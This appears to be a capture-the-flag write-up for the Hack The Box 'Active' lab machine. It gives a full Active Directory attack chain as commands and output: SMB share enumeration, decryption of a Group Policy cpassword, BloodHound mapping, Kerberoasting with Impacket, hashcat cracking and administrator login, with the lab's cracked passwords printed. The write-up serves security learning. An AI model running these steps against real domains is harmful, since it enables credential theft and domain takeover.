# Active

## Table Of Contents:
<!--ts-->
  * [Port & Service Enumeration](#port-&-service-enumeration)
    * [LDAP](#LDAP)
    * [SMB](#SMB)
  * [Initial Access](#intial-access)
    * [Cracking Encrypted Password](#cracking-encrypted-password)
  * [Privilege Escalation](#privilege-escalation)
    * [Remote BloodHound](#remote-bloodhound)
    * [Kerberoast Attack](#kerberoast-attack)
    * [Password Cracking - TGT](#cracking-tgt-password)
  * [Alternate Methods](#alternate-methods)
    * [Enumerate Users](#enumerating-users)
    * [Enumerate Kerberoastable Users](#enumerate-kerberoastable-users)
<!--te-->

# **Port & Service Enumeration**

## Nmap Scans

### Generic Nmap Scan

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-7fh072w4l6]─[~]
└──╼ [★]$ nmap -sC -sV -vv 10.129.38.174
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 20:14 CST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Initiating Ping Scan at 20:14
Scanning 10.129.38.174 [4 ports]
Completed Ping Scan at 20:14, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:14
Completed Parallel DNS resolution of 1 host. at 20:14, 0.00s elapsed
Initiating SYN Stealth Scan at 20:14
Scanning 10.129.38.174 [1000 ports]
Discovered open port 139/tcp on 10.129.38.174
Discovered open port 135/tcp on 10.129.38.174
Discovered open port 53/tcp on 10.129.38.174
Discovered open port 445/tcp on 10.129.38.174
Discovered open port 636/tcp on 10.129.38.174
Discovered open port 49157/tcp on 10.129.38.174
Discovered open port 49155/tcp on 10.129.38.174
Discovered open port 88/tcp on 10.129.38.174
Discovered open port 49158/tcp on 10.129.38.174
Discovered open port 3268/tcp on 10.129.38.174
Discovered open port 49153/tcp on 10.129.38.174
Discovered open port 464/tcp on 10.129.38.174
Discovered open port 389/tcp on 10.129.38.174
Discovered open port 49154/tcp on 10.129.38.174
Discovered open port 49152/tcp on 10.129.38.174
Discovered open port 3269/tcp on 10.129.38.174
Discovered open port 593/tcp on 10.129.38.174
Completed SYN Stealth Scan at 20:14, 1.24s elapsed (1000 total ports)
Initiating Service scan at 20:14
Scanning 17 services on 10.129.38.174
Completed Service scan at 20:15, 59.72s elapsed (17 services on 1 host)
NSE: Script scanning 10.129.38.174.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 8.49s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.26s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Nmap scan report for 10.129.38.174
Host is up, received echo-reply ttl 127 (0.0090s latency).
Scanned at 2025-01-01 20:14:27 CST for 69s
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-02 02:14:35Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-02T02:15:31
|_  start_date: 2025-01-02T02:12:28
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42989/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 39928/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 3654/udp): CLEAN (Timeout)
|   Check 4 (port 45616/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:15
Completed NSE at 20:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.10 seconds
           Raw packets sent: 1034 (45.472KB) | Rcvd: 1002 (40.180KB)
```

From the open ports this appears to be an Active Directory Challenge...

## **LDAP**

## **SMB**

### Share Enumeration: Anonymous Bind

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-7fh072w4l6]─[~]
└──╼ [★]$ smbmap -H 10.129.38.174
[+] IP: 10.129.38.174:445	Name: 10.129.38.174                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

Let's also try this recursively!

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-7fh072w4l6]─[~]
└──╼ [★]$ smbmap -H 10.129.38.174 -R
[+] IP: 10.129.38.174:445	Name: 10.129.38.174                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
	.\Replication\active.htb\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
	.\Replication\active.htb\DfsrPrivate\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Installing
	.\Replication\active.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              119 Sat Jul 21 05:38:11 2018	GPE.INI
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               22 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Windows NT
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```

Yay! We can anonymously read the *Replication* Share!

### **Download All Files to Attacker Machine**

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~]
└──╼ [★]$ smbclient -U '%' -N \\\\10.129.38.174\\Replication
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

		5217023 blocks of size 4096. 278375 blocks available
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

# **Initial Access**

After looking through the extracted files we find a username *SVC_TGS* and an encrypted password in the *groups.xml* file!

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="<REDACTED>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
## **Cracking Encrypted Password**

Doing a simple Google search on *cpassword* we find that it is a known mal-practice of storing passwords in GPOs.

Additionally, we can use this tools to crack the password: [gpp-decrypt tool](https://github.com/t0thkr1s/gpp-decrypt)

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop/gpp-decrypt]
└──╼ [★]$ python gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Password: GPPstillStandingStrong2k18
```

## **Using *smbclient* To Login**

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop/gpp-decrypt]
└──╼ [★]$ smbclient -U 'active/SVC_TGS%GPPstillStandingStrong2k18' \\\\10.129.38.174\\Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

		5217023 blocks of size 4096. 277863 blocks available
smb: \> 
```

# **Privilege Escalation**

## **Remote BloodHound**

Now that we have credentials to a valid user in the Domain we can run BloodHound remotely to map any privilege escalation vectors!

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
└──╼ [★]$ bloodhound-python -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -ns 10.129.38.174 -c All
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.active.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 02S
```
Now Upload the created JSON files into BloodHound!

## **Kerberoast Attck**

Looking at the BloodHound Results, the *SVC_TGS* account does NOT have any direct paths to gain more privs.

However, running the built-in query to find Kerberoastable Accounts reveals that the *Administrator* is susceptible to Kerberoasting!

![image](https://github.com/user-attachments/assets/4b038cc8-2507-4438-9938-e9b772027b39)

### **Using *Get-UserSPNs.py* to Get TGT for Administrator**

**NOTE:** Ensure you add *active.htb* to */etc/hosts* first.

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
└──╼ [★]$ python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile kerberoast
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-01-01 20:13:34.577755             



[-] CCache file is not found. Skipping...
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
└──╼ [★]$ cat kerberoast 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$39833e43716b6374fe874c773e4dd8ab$16eb56112e91aa3028bd800a538937f7a948d3f869876c4203fcd0550e8fa7c46e16d6750bb63932a951928277e29db716340d5491f7270765797e429e785566821d0a9059c80239961b66487924b5f91f0eca90dd93a203fa0ef7b0d9568c09deacefd504514997c72e592e58e32d72140307e6b2828ab00d4d041301c85a6aa365f8f01a43176de09127ac5801b8b397ce82df9f9aa50c0e2acd59ee87f30592328a10e6f2d95eacf55fe3876a42c2ae2d09f10d784e60b555dc44fab21cacf48ad8030f5a8af4222141e8ccd47faf56c4691078e58d7025146cb900cb80cc4f1229518871846f39084ddaf22eb7632cabb48508867a5335bff60e02507f502afbbb5f736e7d8689e8428aa28c6640b63942a1624217ebc260ae59b9af6a2ec7dc120b30010053d4998744f3426d02e519a9e5aa5474f3226aba5f1549bef23687e73b6a12d832dce002fdba17100c7ebe2b717c2ae2902384e4c1a4097907159019145e6dd9cce90b2068c8ed86b2fa76ab67ce3b23d9e0d83286b87f1b82c74bbaa9fd9583c55731d25b47ea41ecdd3ac83ee2e646be281049fcac1d12fb77f5e8f3d624388be3ef866301621dfb36d575ff2130a74916ca7187e29f17b614a78d28128410315265da907b7cb66654bc870a1b15fb44957662f7ac73485082ddc2a0a71dc5f325a7a160f4a0ffdf911528501da8bdee2c970d87516b0e61829f12c0582e98754cf7ecff29b8e7c6b5f0e82e9fa4733e9c292e427834629bdeb219af6ce608dae338935189f29b40e027c1a8320e268747889761d0f766e147bb74bf67c6cc8ff54a74b54abb4e64c3ba3953a202220bf95755e502a911600c4b17691fe8555e24bd8a5d02bab9d9ce036dce35e304fbe8c1dfdb87eb15de0e6edd8383a38288fc1abfa1e2d6641255a855a90033423a9fdde23eb5b8c217cc6254c0096b0bf83a67cf62e8bb4b0b57aa70b80da759306f73f761d10239af96e18b125204566904ffd6505b719a0157ecaca55b53e6537260102e6f64567cbeaffc2ee88282ebee68571090b6b2d1e08540cbba6e27b1a36dab990dae42fcc45773cf5566ccfde996f3c3c90cacea496387c9d6207db3e1d18fc10651765c57b3824a7d938e18dbaf5200e1f01573c8ad4f5d81ee81b46b98e6ed79d7917c15185fcfdbc75d79bd58e7abc743532fb8b43ae0e429dd19cb54ff9c561ee132e92d4346f4f58e64c532b69cbb359bb374c9c3b4288a5292d242
```

## **Cracking TGT Password**

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
└──╼ [★]$ hashcat -m 13100 -a 0 kerberoast /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$39833e43716b6374fe874c773e4dd8ab$16eb56112e91aa3028bd800a538937f7a948d3f869876c4203fcd0550e8fa7c46e16d6750bb63932a951928277e29db716340d5491f7270765797e429e785566821d0a9059c80239961b66487924b5f91f0eca90dd93a203fa0ef7b0d9568c09deacefd504514997c72e592e58e32d72140307e6b2828ab00d4d041301c85a6aa365f8f01a43176de09127ac5801b8b397ce82df9f9aa50c0e2acd59ee87f30592328a10e6f2d95eacf55fe3876a42c2ae2d09f10d784e60b555dc44fab21cacf48ad8030f5a8af4222141e8ccd47faf56c4691078e58d7025146cb900cb80cc4f1229518871846f39084ddaf22eb7632cabb48508867a5335bff60e02507f502afbbb5f736e7d8689e8428aa28c6640b63942a1624217ebc260ae59b9af6a2ec7dc120b30010053d4998744f3426d02e519a9e5aa5474f3226aba5f1549bef23687e73b6a12d832dce002fdba17100c7ebe2b717c2ae2902384e4c1a4097907159019145e6dd9cce90b2068c8ed86b2fa76ab67ce3b23d9e0d83286b87f1b82c74bbaa9fd9583c55731d25b47ea41ecdd3ac83ee2e646be281049fcac1d12fb77f5e8f3d624388be3ef866301621dfb36d575ff2130a74916ca7187e29f17b614a78d28128410315265da907b7cb66654bc870a1b15fb44957662f7ac73485082ddc2a0a71dc5f325a7a160f4a0ffdf911528501da8bdee2c970d87516b0e61829f12c0582e98754cf7ecff29b8e7c6b5f0e82e9fa4733e9c292e427834629bdeb219af6ce608dae338935189f29b40e027c1a8320e268747889761d0f766e147bb74bf67c6cc8ff54a74b54abb4e64c3ba3953a202220bf95755e502a911600c4b17691fe8555e24bd8a5d02bab9d9ce036dce35e304fbe8c1dfdb87eb15de0e6edd8383a38288fc1abfa1e2d6641255a855a90033423a9fdde23eb5b8c217cc6254c0096b0bf83a67cf62e8bb4b0b57aa70b80da759306f73f761d10239af96e18b125204566904ffd6505b719a0157ecaca55b53e6537260102e6f64567cbeaffc2ee88282ebee68571090b6b2d1e08540cbba6e27b1a36dab990dae42fcc45773cf5566ccfde996f3c3c90cacea496387c9d6207db3e1d18fc10651765c57b3824a7d938e18dbaf5200e1f01573c8ad4f5d81ee81b46b98e6ed79d7917c15185fcfdbc75d79bd58e7abc743532fb8b43ae0e429dd19cb54ff9c561ee132e92d4346f4f58e64c532b69cbb359bb374c9c3b4288a5292d242:Ticketmaster1968
```

## **Login as Administrator**

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
└──╼ [★]$ smbclient -U "Administrator%Ticketmaster1968" \\\\10.129.38.174\\Users
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

		5217023 blocks of size 4096. 277863 blocks available
```


###########################################################################################################

# **Alternate Methods**

## **Enumerate Users**

```bash
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
Password: GPPstillStandingStrong2k18
[*] Querying 10.10.10.100 for information about domain.
Name Email PasswordLastSet LastLogon 
---------------- -------- ------------------------- -------------------
Administrator 2018-07-18 20:06:40.351723 2023-11-27 09:57:39.876136 
Guest <never> <never> 
krbtgt 2018-07-18 19:50:36.972031 <never> 
SVC_TGS 2018-07-18 21:14:38.402764 2018-07-21 15:01:30.320277
```

```bash
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

## **Enumerate Kerberoastable Users**

```bash
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
serviceprincipalname | grep -B 1 servicePrincipalName
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```
